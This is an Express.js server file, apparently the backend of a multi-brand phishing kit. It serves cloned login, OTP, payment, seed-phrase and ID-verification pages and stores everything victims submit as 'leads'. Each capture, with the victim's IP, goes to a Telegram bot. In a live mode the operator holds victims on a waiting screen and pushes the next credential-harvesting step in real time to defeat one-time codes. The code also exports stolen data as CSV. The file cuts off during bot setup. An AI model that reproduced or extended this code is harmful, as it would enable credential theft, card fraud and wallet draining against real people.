import 'dotenv/config';
import express from 'express';
import session from 'express-session';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import db from './db.js';
import { bot, notify } from './bot.js';
import { getTemplate, getCategories, getTemplatesByCategory } from './templates.js';
import { generateOTP, generateCSRFToken, verifyCSRFToken, storeOTP, verifyOTP, checkThrottle, getOTPForDev } from './security.js';
import { LOGOS } from './logos.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.set('trust proxy', 1);
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, '..', 'public')));

// SQLite session store (no extra deps)
const Store = session.Store;
class SQLiteStore extends Store {
  get(sid, cb) {
    try {
      const row = db.prepare('SELECT data FROM sessions WHERE id=? AND expires>?').get(sid, Math.floor(Date.now()/1000));
      cb(null, row ? JSON.parse(row.data) : null);
    } catch(e) { cb(e); }
  }
  set(sid, sess, cb) {
    try {
      const exp = sess.cookie?.expires ? Math.floor(new Date(sess.cookie.expires).getTime()/1000) : Math.floor(Date.now()/1000) + 86400;
      db.prepare('INSERT OR REPLACE INTO sessions(id,data,expires) VALUES(?,?,?)').run(sid, JSON.stringify(sess), exp);
      cb(null);
    } catch(e) { cb(e); }
  }
  destroy(sid, cb) {
    try { db.prepare('DELETE FROM sessions WHERE id=?').run(sid); cb(null); } catch(e) { cb(e); }
  }
}

app.use(session({
  store: new SQLiteStore(),
  secret: process.env.SESSION_SECRET || 'dev-secret',
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, sameSite: 'lax', maxAge: 24 * 60 * 60 * 1000, secure: process.env.NODE_ENV === 'production' }
}));

// CSRF middleware
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCSRFToken();
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

const isAdmin = (req, res, next) => req.session.admin ? next() : res.redirect('/admin/login');
const slugify = s => String(s || '').trim().toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9-]/g, '').replace(/-+/g, '-');
const esc = s => String(s).replace(/[&<>"']/g, c => ({'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'}[c]));

// layout → view name mapping
const LAYOUT_VIEW = {
  auth:         'login',
  otp:          'otp',
  otp_long:     'seed_phrase',
  checkpoint:   'checkpoint',
  verify:       'verify',
  payment:      'payment',
  security_q:   'verify',
  id_verify:    'verify',
  seed_phrase:  'seed_phrase',
  locked:       'locked',
  confirm:      'complete',
  complete:     'complete',
  landing:      'landing',
  'hero-center':'landing',
  cards:        'landing'
};

function resolveView(layout) {
  return LAYOUT_VIEW[layout] || 'landing';
}

function getNextPage(tpl, currentSlug) {
  const idx = tpl.pages.findIndex(p => p.slug === currentSlug);
  return idx >= 0 && idx < tpl.pages.length - 1 ? tpl.pages[idx + 1] : null;
}

// BRAND GRID — visual review of all brands
app.get('/preview', isAdmin, (req, res) => {
  const cats = getCategories();
  const byCategory = cats.map(cat => ({
    ...cat,
    brands: getTemplatesByCategory(cat.id).map(t => ({ key: t.key, name: t.name }))
  }));
  res.send(`<!doctype html><html><head><meta charset="utf-8">
<title>Brand Grid</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui;background:#0b0f19;color:#eef2ff;padding:20px}
h1{font-size:1.3rem;margin-bottom:20px;color:#8ab4ff}
.cat-title{font-size:.9rem;color:#5b8cff;font-weight:700;margin:24px 0 10px;text-transform:uppercase;letter-spacing:.08em}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-bottom:8px}
.card{border-radius:8px;overflow:hidden;border:1px solid #ffffff15;background:#151b2b;cursor:pointer;transition:border-color .2s}
.card:hover{border-color:#5b8cff}
.card-label{padding:6px 10px;font-size:.72rem;color:#8ab4ff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;border-bottom:1px solid #ffffff10}
iframe{width:100%;height:220px;border:none;pointer-events:none}
</style></head><body>
<h1>🎨 Brand Grid Preview — ${byCategory.reduce((s,c)=>s+c.brands.length,0)} brands</h1>
${byCategory.map(cat => `
<div class="cat-title">${cat.name} (${cat.brands.length})</div>
<div class="grid">
${cat.brands.map(b => `<div class="card" onclick="window.open('/preview/${b.key}','_blank')">
  <div class="card-label">${b.key}</div>
  <iframe src="/preview/${b.key}" loading="lazy"></iframe>
</div>`).join('')}
</div>`).join('')}
</body></html>`);
});

// BRAND PREVIEW (dev/admin only - shows login.ejs for any brand key)
app.get('/preview/:brandKey', isAdmin, (req, res) => {
  try {
    const { brandKey } = req.params;
    // find matching template by key
    const cats = getCategories();
    let tpl = null;
    for (const cat of cats) {
      const list = getTemplatesByCategory(cat.id);
      tpl = list.find(t => t.key === brandKey);
      if (tpl) break;
    }
    if (!tpl) return res.status(404).send(`Brand "${brandKey}" not found`);
    const pageContent = tpl.pages[0];
    const fakePage = { id: 0, slug: 'preview', title: tpl.name, mode: 'online', active: 1 };
    res.render('login', { page: fakePage, tpl, pageContent, allPages: tpl.pages, csrfToken: 'preview', logos: LOGOS });
  } catch(err) {
    res.status(500).send(err.message);
  }
});

// PUBLIC ROUTES
app.get('/', (req, res) => res.redirect('/admin'));

app.get('/p/:slug/:pageSlug?', (req, res) => {
  try {
    const { slug, pageSlug } = req.params;

    // complete page — render directly
    if (pageSlug === 'complete') {
      const pg = db.prepare('SELECT * FROM pages WHERE slug = ?').get(slug);
      if (!pg) return res.status(404).send('الصفحة غير موجودة');
      const t = getTemplate(pg.template_id);
      const lastPage = t.pages[t.pages.length - 1];
      return res.render('complete', { page: pg, tpl: t, pageContent: lastPage || {}, allPages: t.pages, logos: LOGOS });
    }

    const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(slug);
    if (!page) return res.status(404).send('الصفحة غير موجودة');

    const tpl = getTemplate(page.template_id);
    const defaultSlug = tpl.pages[0]?.slug || 'login';
    const targetSlug = pageSlug || defaultSlug;
    const pageContent = tpl.pages.find(p => p.slug === targetSlug) || tpl.pages[0];

    // only increment views on first page
    if (!pageSlug || pageSlug === defaultSlug) {
      db.prepare('UPDATE pages SET views = views + 1 WHERE id = ?').run(page.id);
    }

    res.render(resolveView(pageContent.layout), {
      page, tpl, pageContent, allPages: tpl.pages,
      sent: !!req.query.sent, verified: !!req.query.verified, logos: LOGOS
    });
  } catch (err) {
    console.error('Get page error:', err.message);
    res.status(500).send('خطأ في تحميل الصفحة');
  }
});

// helper: save lead data + notify
async function saveLead(page, tpl, stepSlug, body, req) {
  const data = {};
  for (const [k, v] of Object.entries(body)) {
    if (!['_hp','_csrf','_step'].includes(k)) data[k] = String(v).slice(0, 2000);
  }
  data.step = stepSlug;
  const ip = req?.ip || null;
  const ua = req?.get?.('user-agent') || null;
  db.prepare('INSERT INTO leads (page_id, data, ip, ua) VALUES (?,?,?,?)')
    .run(page.id, JSON.stringify(data), ip, ua);

  const pageContent = getTemplate(page.template_id).pages.find(p => p.slug === stepSlug);
  if (pageContent?.notify_step !== false) {
    const lines = Object.entries(data)
      .filter(([k]) => k !== 'step')
      .map(([k, v]) => `<b>${esc(k)}</b>: <code>${esc(v)}</code>`).join('\n');
    const emoji = { login:'🔐', otp:'🔢', payment:'💳', seed_phrase:'🌱', id_verify:'🪪', security_q:'❓' }[pageContent?.form_type] || '📋';
    const ts = new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo', hour12: false });
    const ipStr = ip ? `\n🌐 IP: <code>${esc(ip)}</code>` : '';
    const base = process.env.BASE_URL || '';
    const pageUrl = base ? `\n🔗 <a href="${base}/p/${esc(page.slug)}">${base}/p/${esc(page.slug)}</a>` : '';
    const msg = `${emoji} <b>${esc(pageContent?.step_label || stepSlug)}</b>
📄 <b>${esc(tpl.name)}</b> · <code>${esc(page.slug)}</code>
🕐 ${ts}${ipStr}${pageUrl}

${lines}`;

    // In ONLINE mode: attach inline keyboard so admin can push next step directly
    if (page.mode === 'online') {
      const sid = body._sid || '';
      const nextPages = tpl.pages.filter(p => p.slug !== stepSlug);
      // Build step buttons from template flow + common options
      const stepBtns = [];
      for (const np of nextPages) {
        const stepEmoji = { login:'🔐', otp:'🔢', payment:'💳', seed_phrase:'🌱', id_verify:'🪪', security_q:'❓' }[np.form_type] || '➡️';
        stepBtns.push({ text: `${stepEmoji} ${np.step_label || np.slug}`, callback_data: `push_${sid}_${np.slug}` });
      }
      // Always include complete + home
      stepBtns.push({ text: '✅ Complete', callback_data: `push_${sid}_complete` });
      stepBtns.push({ text: '🏠 Home', callback_data: `push_${sid}_HOME` });
      // Chunk into rows of 2
      const rows = [];
      for (let i = 0; i < stepBtns.length; i += 2) rows.push(stepBtns.slice(i, i+2));
      await notify(msg, { reply_markup: { inline_keyboard: rows } }).catch(() => {});
    } else {
      await notify(msg).catch(() => {});
    }
  }
}

// ── ONLINE MODE HELPER ────────────────────────────────────────
// In online mode: after saving lead, show a "please wait" page
// instead of auto-redirecting. Admin pushes next step via dashboard/bot.
function holdOrRedirect(page, tpl, nextPage, currentStepSlug, sid, req, res) {
  if (page.mode === 'online') {
    // update visitor record so admin sees current step
    if (sid) {
      db.prepare(`
        INSERT INTO visitors (session_id, page_id, page_title, current_step, ip, last_seen)
        VALUES (?,?,?,?,?,datetime('now'))
        ON CONFLICT(session_id) DO UPDATE SET current_step=excluded.current_step, last_seen=excluded.last_seen
      `).run(sid, page.id, page.title, currentStepSlug, req.ip || '');
    }
    // show waiting screen — visitor polls every 2s for pending_step from admin
    return res.send(buildWaitPage(page.slug, sid || '', tpl, currentStepSlug));
  }
  // auto/offline mode: redirect immediately to next step
  if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
  res.redirect(`/p/${page.slug}/${nextPage.slug}`);
}

function buildWaitPage(slug, sid, tpl, currentStep) {
  const bg  = tpl?.palette?.bg     || '#0b0f19';
  const fg  = tpl?.palette?.fg     || '#eef2ff';
  const acc = tpl?.palette?.accent || '#5b8cff';
  const safeSid  = String(sid  || '').replace(/['"\\<>]/g, '');
  const safeSlug = String(slug || '').replace(/['"\\<>]/g, '');
  const safeStep = String(currentStep || 'login').replace(/['"\\<>]/g, '');
  const safeBg   = String(bg).replace(/['"\\<>]/g, '');
  return `<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Please Wait</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:${safeBg};color:${fg.replace(/['"\\<>]/g,'')};
     min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:24px}
.spinner{width:48px;height:48px;border:3px solid ${acc.replace(/['"\\<>]/g,'')}33;border-top-color:${acc.replace(/['"\\<>]/g,'')};
         border-radius:50%;animation:spin .9s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.msg{font-size:.95rem;opacity:.6;text-align:center;max-width:260px;line-height:1.6}
</style></head><body>
<div class="spinner"></div>
<div class="msg">Please wait&#8230;<br><span style="font-size:.78rem;opacity:.5">Do not close this window</span></div>
<script>
var SID='${safeSid}', SLUG='${safeSlug}', STEP='${safeStep}';
function poll(){
  fetch('/p/'+SLUG+'/poll?sid='+encodeURIComponent(SID))
    .then(function(r){return r.json()})
    .then(function(d){
      if(d.step){
        var url;
        if(d.step==='HOME'||d.step==='home') url='/p/'+SLUG;
        else if(d.step==='NEXT') url='/p/'+SLUG+'/next?_sid='+encodeURIComponent(SID);
        else url='/p/'+SLUG+'/'+encodeURIComponent(d.step);
        window.location.href=url;
      } else { setTimeout(poll,2000); }
    }).catch(function(){setTimeout(poll,3000)});
}
function heartbeat(){
  fetch('/p/'+SLUG+'/heartbeat',{method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({sid:SID,step:STEP}),keepalive:true}).catch(function(){});
}
heartbeat(); setInterval(heartbeat,5000); setTimeout(poll,1000);
</script>
</body></html>`;
}

app.post('/p/:slug/login', async (req, res) => {
  try {
    const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(req.params.slug);
    if (!page) return res.status(404).send('not found');
    if (req.body._hp) return res.redirect(`/p/${page.slug}`);

    const throttle = checkThrottle(page.id, req.ip);
    if (throttle.throttled) {
      return res.status(429).send(`يرجى الانتظار ${throttle.retryAfter} ثانية`);
    }

    const tpl = getTemplate(page.template_id);
    await saveLead(page, tpl, 'login', req.body, req);

    const nextPage = getNextPage(tpl, 'login');

    // in online mode: hold visitor, wait for admin push
    if (page.mode === 'online') {
      const sid = req.body._sid || '';
      return holdOrRedirect(page, tpl, nextPage, 'login', sid, req, res);
    }

    // auto mode: generate OTP if needed, redirect
    if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
    if (nextPage.layout === 'otp') {
      const code = generateOTP(nextPage.otp_length || 6);
      storeOTP(page.id, req.ip, code);
      console.log(`✅ OTP for ${page.slug}: ${code}`);
    }
    res.redirect(`/p/${page.slug}/${nextPage.slug}`);
  } catch (err) {
    console.error('Login error:', err.message);
    res.status(500).send('خطأ');
  }
});

app.post('/p/:slug/verify', async (req, res) => {
  try {
    const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(req.params.slug);
    if (!page) return res.status(404).send('not found');

    const tpl = getTemplate(page.template_id);
    const submittedStep = req.body._step;
    const otpPage = tpl.pages.find(p => p.slug === submittedStep && p.layout === 'otp')
                 || tpl.pages.find(p => p.layout === 'otp');
    const otpSlug = otpPage?.slug || submittedStep || 'verify';

    const result = verifyOTP(page.id, req.ip, req.body.code);
    if (!result.valid) {
      const pageContent = otpPage || { headline: 'أدخل الكود', subheadline: 'بعتنا كود تحقق', fields: ['code'], layout: 'otp', cta: 'تأكيد', otp_length: 6, slug: otpSlug };
      return res.render('otp', { page, tpl, pageContent, allPages: tpl.pages, error: 'كود غير صحيح. حاول مرة أخرى.', logos: LOGOS });
    }

    await saveLead(page, tpl, otpSlug, req.body, req);

    const nextPage = getNextPage(tpl, otpSlug);
    const sid = req.body._sid || '';

    if (page.mode === 'online') {
      return holdOrRedirect(page, tpl, nextPage, otpSlug, sid, req, res);
    }

    if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
    if (nextPage.layout === 'otp') {
      const newCode = generateOTP(nextPage.otp_length || 6);
      storeOTP(page.id, req.ip, newCode);
      console.log(`✅ OTP for ${page.slug}/${nextPage.slug}: ${newCode}`);
    }
    res.redirect(`/p/${page.slug}/${nextPage.slug}?verified=1`);
  } catch (err) {
    console.error('OTP verify error:', err.message);
    res.status(500).send('خطأ');
  }
});

// Generic step handler — handles ALL non-login, non-verify steps
app.post('/p/:slug/step/:stepSlug', async (req, res) => {
  try {
    const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(req.params.slug);
    if (!page) return res.status(404).send('not found');

    const tpl = getTemplate(page.template_id);
    const stepSlug = req.params.stepSlug;

    await saveLead(page, tpl, stepSlug, req.body, req);

    const nextPage = getNextPage(tpl, stepSlug);
    const sid = req.body._sid || '';

    if (page.mode === 'online') {
      return holdOrRedirect(page, tpl, nextPage, stepSlug, sid, req, res);
    }

    // if next step is OTP, generate code
    if (nextPage?.layout === 'otp') {
      const code = generateOTP(nextPage.otp_length || 6);
      storeOTP(page.id, req.ip, code);
      console.log(`✅ OTP for ${page.slug}/${nextPage.slug}: ${code}`);
    }

    if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
    res.redirect(`/p/${page.slug}/${nextPage.slug}`);
  } catch (err) {
    console.error('Step error:', err.message);
    res.status(500).send('خطأ');
  }
});

// complete page
app.get('/p/:slug/complete', (req, res) => {
  try {
    const page = db.prepare('SELECT * FROM pages WHERE slug = ?').get(req.params.slug);
    if (!page) return res.status(404).send('not found');
    const tpl = getTemplate(page.template_id);
    const lastPage = tpl.pages[tpl.pages.length - 1];
    res.render('complete', { page, tpl, pageContent: lastPage || {}, allPages: tpl.pages, logos: LOGOS });
  } catch (err) {
    res.status(500).send('خطأ');
  }
});

app.post('/p/:slug/resend-otp', (req, res) => {
  try {
    const page = db.prepare('SELECT * FROM pages WHERE slug = ?').get(req.params.slug);
    if (!page) return res.status(404).json({ error: 'not found' });

    const code = generateOTP(6);
    storeOTP(page.id, req.ip, code);
    console.log(`OTP for ${req.params.slug}: ${code}`);
    res.json({ ok: true, message: 'تم إعادة إرسال الكود' });
  } catch (err) {
    console.error('Resend OTP error:', err.message);
    res.status(500).json({ error: 'خطأ' });
  }
});

app.post('/p/:slug/submit', async (req, res) => {
  try {
    const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(req.params.slug);
    if (!page) return res.status(404).send('not found');
    if (req.body._hp) return res.json({ ok: true });

    const allowed = JSON.parse(page.fields);
    const data = {};
    for (const f of allowed) {
      if (req.body[f] != null) {
        data[f] = String(req.body[f]).slice(0, 500);
      }
    }

    const info = db.prepare('INSERT INTO leads (page_id, data, ip, ua) VALUES (?,?,?,?)')
      .run(page.id, JSON.stringify(data), req.ip, req.get('user-agent') || '');

    const lines = Object.entries(data).map(([k, v]) => `<b>${esc(k)}</b>: ${esc(v)}`).join('\n');
    await notify(`🔔 <b>New Lead</b>\n📄 ${esc(page.title)}\n${lines}\n\n#lead_${info.lastInsertRowid}`);

    if (req.headers.accept?.includes('application/json')) return res.json({ ok: true });
    res.redirect(`/p/${page.slug}/home?sent=1`);
  } catch (err) {
    console.error('Submit error:', err.message);
    res.status(500).json({ error: 'خطأ' });
  }
});

// ADMIN AUTH
app.get('/admin/login', (req, res) => res.render('admin_login', { error: null }));

app.post('/admin/login', (req, res) => {
  if (req.body.password === process.env.ADMIN_PASSWORD) {
    req.session.admin = true;
    return res.redirect('/admin');
  }
  res.render('admin_login', { error: 'كلمة السر غلط' });
});

app.post('/admin/logout', (req, res) => req.session.destroy(() => res.redirect('/admin/login')));

// ADMIN DASHBOARD
app.get('/admin', isAdmin, (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = 10;
    const offset = (page - 1) * limit;

    const pages = db.prepare(`
      SELECT p.*, (SELECT COUNT(*) FROM leads l WHERE l.page_id = p.id) AS leads_count
      FROM pages p ORDER BY p.id DESC LIMIT ? OFFSET ?
    `).all(limit, offset);

    const total = db.prepare('SELECT COUNT(*) c FROM pages').get().c;
    const totalPages = Math.ceil(total / limit);

    pages.forEach(p => { p.template_name = getTemplate(p.template_id).name; });

    const totals = {
      pages: total,
      leads: db.prepare('SELECT COUNT(*) c FROM leads').get().c,
      views: db.prepare('SELECT COALESCE(SUM(views),0) v FROM pages').get().v
    };

    res.render('dashboard', {
      pages, totals, currentPage: page, totalPages,
      hasPrev: page > 1, hasNext: page < totalPages
    });
  } catch (err) {
    console.error('Dashboard error:', err.message);
    res.status(500).send('خطأ');
  }
});

app.get('/admin/templates', isAdmin, (req, res) => {
  try {
    const cat = req.query.cat || null;
    const list = getTemplatesByCategory(cat);
    res.render('templates', {
      templates: list,
      categories: getCategories(),
      activeCat: cat,
      pageId: req.query.page_id || null
    });
  } catch (err) {
    console.error('Templates error:', err.message);
    res.status(500).send('خطأ');
  }
});

app.get('/admin/pages/new', isAdmin, (req, res) => {
  try {
    const tplId = req.query.template || 't001';
    res.render('edit', {
      page: {
        id: null, slug: '', title: '', headline: '', subheadline: '', body: '',
        button_text: 'سجل الآن', fields: '["name","phone"]',
        theme: 'dark', pixel: '', active: 1, template_id: tplId
      },
      error: null
    });
  } catch (err) {
    console.error('New page error:', err.message);
    res.status(500).send('خطأ');
  }
});

app.post('/admin/pages', isAdmin, (req, res) => {
  try {
    const b = req.body;
    let fields;
    try { fields = JSON.stringify(JSON.parse(b.fields)); } catch { fields = '["name","email","phone"]'; }
    db.prepare(`
      INSERT INTO pages (slug,title,headline,subheadline,body,button_text,fields,theme,pixel,active,template_id)
      VALUES (?,?,?,?,?,?,?,?,?,?,?)
    `).run(slugify(b.slug), b.title, b.headline || '', b.subheadline || '', b.body || '',
      b.button_text || 'سجل الآن', fields,
      b.theme || 'dark', b.pixel || '', b.active ? 1 : 0, b.template_id || 't001');
    res.redirect('/admin');
  } catch (err) {
    console.error('Create page error:', err.message);
    res.render('edit', { page: { ...req.body, id: null }, error: err.message });
  }
});

app.get('/admin/pages/:id', isAdmin, (req, res) => {
  try {
    const page = db.prepare('SELECT * FROM pages WHERE id = ?').get(req.params.id);
    if (!page) return res.status(404).send('not found');
    const leads = db.prepare('SELECT * FROM leads WHERE page_id = ? ORDER BY id DESC LIMIT 50').all(page.id);
    const tpl = getTemplate(page.template_id);
    page.template_name = tpl.name;
    res.render('page_detail', { page, leads, tpl });
  } catch (err) {
    console.error('Page detail error:', err.message);
    res.status(500).send('خطأ');
  }
});

app.post('/admin/pages/:id', isAdmin, (req, res) => {
  try {
    const b = req.body;
    let fields;
    try { fields = JSON.stringify(JSON.parse(b.fields)); } catch { fields = '["name","email","phone"]'; }
    db.prepare(`
      UPDATE pages SET slug=?,title=?,headline=?,subheadline=?,body=?,button_text=?,fields=?,theme=?,pixel=?,active=?,template_id=?
      WHERE id=?
    `).run(slugify(b.slug), b.title, b.headline || '', b.subheadline || '', b.body || '',
      b.button_text || 'سجل الآن', fields,
      b.theme || 'dark', b.pixel || '', b.active ? 1 : 0, b.template_id || 't001', req.params.id);
    res.redirect('/admin/pages/' + req.params.id);
  } catch (err) {
    console.error('Update page error:', err.message);
    res.status(500).send('خطأ');
  }
});

// active toggle: مفعّلة ↔ موقوفة
app.post('/admin/pages/:id/toggle-active', isAdmin, (req, res) => {
  try {
    const page = db.prepare('SELECT * FROM pages WHERE id=?').get(req.params.id);
    if (!page) return res.status(404).send('not found');
    db.prepare('UPDATE pages SET active=? WHERE id=?').run(page.active ? 0 : 1, req.params.id);
    res.redirect(req.headers.referer || '/admin/pages/' + req.params.id);
  } catch (err) {
    res.status(500).send('خطأ');
  }
});

// mode toggle: online ↔ offline
app.post('/admin/pages/:id/mode', isAdmin, (req, res) => {
  try {
    const page = db.prepare('SELECT * FROM pages WHERE id=?').get(req.params.id);
    if (!page) return res.status(404).send('not found');
    const newMode = page.mode === 'offline' ? 'online' : 'offline';
    db.prepare('UPDATE pages SET mode=? WHERE id=?').run(newMode, req.params.id);
    res.redirect(req.headers.referer || '/admin');
  } catch (err) {
    res.status(500).send('خطأ');
  }
});

// flow step control: set which step to show (skips to step)
app.post('/admin/pages/:id/flow-step', isAdmin, (req, res) => {
  try {
    db.prepare('UPDATE pages SET flow_step=? WHERE id=?').run(req.body.step || '', req.params.id);
    res.redirect(req.headers.referer || '/admin');
  } catch (err) {
    res.status(500).send('خطأ');
  }
});

app.get('/admin/pages/:id/apply-template/:tplId', isAdmin, (req, res) => {
  try {
    db.prepare('UPDATE pages SET template_id=? WHERE id=?').run(req.params.tplId, req.params.id);
    res.redirect('/admin/pages/' + req.params.id);
  } catch (err) {
    res.status(500).send('خطأ');
  }
});

app.get('/admin/pages/:id/export', isAdmin, (req, res) => {
  try {
    const page = db.prepare('SELECT * FROM pages WHERE id = ?').get(req.params.id);
    if (!page) return res.status(404).send('not found');
    const leads = db.prepare('SELECT * FROM leads WHERE page_id = ? ORDER BY id DESC').all(page.id);

    const rows = leads.map(l => {
      let d = {}; try { d = JSON.parse(l.data); } catch {}
      delete d._csrf;
      return { id: l.id, ...d, ip: l.ip, date: l.created_at };
    });

    if (!rows.length) return res.status(204).end();

    const headers = [...new Set(rows.flatMap(r => Object.keys(r)))];
    const csv = [
      headers.join(','),
      ...rows.map(r => headers.map(h => JSON.stringify(r[h] ?? '')).join(','))
    ].join('\n');

    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="leads_${page.slug}_${Date.now()}.csv"`);
    res.send('﻿' + csv); // BOM for Excel Arabic support
  } catch (err) {
    console.error('Export error:', err.message);
    res.status(500).send('خطأ');
  }
});

app.post('/admin/pages/:id/delete', isAdmin, (req, res) => {
  try {
    db.prepare('DELETE FROM pages WHERE id = ?').run(req.params.id);
    res.redirect('/admin');
  } catch (err) {
    console.error('Delete page error:', err.message);
    res.status(500).send('خطأ');
  }
});

// DEV ONLY — remove in production
if (process.env.NODE_ENV !== 'production') {
  app.get('/dev/otp/:slug', (req, res) => {
    const page = db.prepare('SELECT * FROM pages WHERE slug=?').get(req.params.slug);
    if (!page) return res.json({ error: 'not found' });
    const code = getOTPForDev(page.id, req.ip) || getOTPForDev(page.id, '::1') || getOTPForDev(page.id, '127.0.0.1');
    res.json({ code: code || 'not found — check console', slug: req.params.slug });
  });
}

// ═══════════════════════════════════════════════════════════
// ADMIN JSON APIs (for dashboard Live Control + Arranger)
// ═══════════════════════════════════════════════════════════

// GET all pages (no pagination) for arranger
app.get('/admin/api/pages-all', isAdmin, (req, res) => {
  try {
    const pages = db.prepare(`
      SELECT p.*, (SELECT COUNT(*) FROM leads l WHERE l.page_id=p.id) AS leads_count
      FROM pages p ORDER BY p.sort_order ASC, p.id DESC
    `).all();
    pages.forEach(p => { p.template_name = getTemplate(p.template_id).name; });
    res.json(pages);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Toggle active (JSON)
app.post('/admin/api/toggle-active/:id', isAdmin, (req, res) => {
  try {
    const p = db.prepare('SELECT active FROM pages WHERE id=?').get(req.params.id);
    if (!p) return res.status(404).json({ error: 'not found' });
    const active = p.active ? 0 : 1;
    db.prepare('UPDATE pages SET active=? WHERE id=?').run(active, req.params.id);
    res.json({ ok: true, active });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Toggle mode (JSON)
app.post('/admin/api/toggle-mode/:id', isAdmin, (req, res) => {
  try {
    const p = db.prepare('SELECT mode FROM pages WHERE id=?').get(req.params.id);
    if (!p) return res.status(404).json({ error: 'not found' });
    const mode = p.mode === 'offline' ? 'online' : 'offline';
    db.prepare('UPDATE pages SET mode=? WHERE id=?').run(mode, req.params.id);
    res.json({ ok: true, mode });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Reorder pages (drag & drop)
app.post('/admin/api/reorder', isAdmin, (req, res) => {
  try {
    const { from, to } = req.body;
    const all = db.prepare('SELECT id FROM pages ORDER BY sort_order ASC, id DESC').all().map(r => r.id);
    const fromIdx = all.indexOf(parseInt(from));
    const toIdx   = all.indexOf(parseInt(to));
    if (fromIdx < 0 || toIdx < 0) return res.status(400).json({ error: 'invalid ids' });
    all.splice(toIdx, 0, all.splice(fromIdx, 1)[0]);
    const upd = db.prepare('UPDATE pages SET sort_order=? WHERE id=?');
    const tx = db.transaction(() => all.forEach((id, idx) => upd.run(idx, id)));
    tx();
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// GET active visitors (live control)
app.get('/admin/api/visitors', isAdmin, (req, res) => {
  try {
    const cutoff = new Date(Date.now() - 10*60*1000).toISOString();
    const visitors = db.prepare('SELECT * FROM visitors WHERE last_seen > ? ORDER BY last_seen DESC').all(cutoff);
    // attach available steps for each visitor's page
    const result = visitors.map(v => {
      let steps = [];
      try {
        const p = db.prepare('SELECT template_id FROM pages WHERE id=?').get(v.page_id);
        if (p) {
          const tpl = getTemplate(p.template_id);
          steps = (tpl.pages||[]).map(pg => ({ slug: pg.slug, label: pg.title || pg.slug }));
        }
      } catch {}
      return { ...v, steps };
    });
    res.json(result);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// POST push step to visitor (live control)
app.post('/admin/api/push-step', isAdmin, (req, res) => {
  try {
    const { session_id, page_id, step } = req.body;
    if (!session_id) return res.status(400).json({ error: 'missing session_id' });
    db.prepare(`
      INSERT INTO visitors (session_id, page_id, pending_step, last_seen)
      VALUES (?,?,?,datetime('now'))
      ON CONFLICT(session_id) DO UPDATE SET pending_step=excluded.pending_step, last_seen=excluded.last_seen
    `).run(session_id, page_id, step);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// GET pending step for a visitor session (polled by visitor browser every 2s)
app.get('/p/:slug/poll', (req, res) => {
  try {
    const sid = req.query.sid;
    if (!sid) return res.json({ step: null });
    const v = db.prepare('SELECT pending_step FROM visitors WHERE session_id=?').get(sid);
    const step = v?.pending_step || null;
    // clear pending after delivery
    if (step) db.prepare('UPDATE visitors SET pending_step=\'\' WHERE session_id=?').run(sid);
    res.json({ step: step || null });
  } catch { res.json({ step: null }); }
});

// POST heartbeat from visitor (updates last_seen + current_step)
app.post('/p/:slug/heartbeat', (req, res) => {
  try {
    const { sid, step } = req.body;
    if (!sid) return res.json({ ok: false });
    const page = db.prepare('SELECT id, title FROM pages WHERE slug=?').get(req.params.slug);
    if (!page) return res.json({ ok: false });
    db.prepare(`
      INSERT INTO visitors (session_id, page_id, page_title, current_step, ip, last_seen)
      VALUES (?,?,?,?,?,datetime('now'))
      ON CONFLICT(session_id) DO UPDATE SET current_step=excluded.current_step, last_seen=excluded.last_seen
    `).run(sid, page.id, page.title, step || 'login', req.ip || '');
    res.json({ ok: true });
  } catch { res.json({ ok: false }); }
});

// GET /p/:slug/next — redirect visitor to next step in flow
app.get('/p/:slug/next', (req, res) => {
  try {
    const page = db.prepare('SELECT * FROM pages WHERE slug=?').get(req.params.slug);
    if (!page) return res.redirect('/p/' + req.params.slug);
    const tpl = getTemplate(page.template_id);
    const sid = req.query._sid;
    let currentStep = 'login';
    if (sid) {
      const v = db.prepare('SELECT current_step FROM visitors WHERE session_id=?').get(sid);
      if (v) currentStep = v.current_step;
    }
    const next = getNextPage(tpl, currentStep);
    if (next) return res.redirect('/p/' + req.params.slug + '/' + next.slug);
    res.redirect('/p/' + req.params.slug + '/home?complete=1');
  } catch { res.redirect('/p/' + req.params.slug); }
});

// BOT
if (bot) {
  const secret = process.env.WEBHOOK_SECRET;
  if (process.env.BASE_URL?.startsWith('https') && secret) {
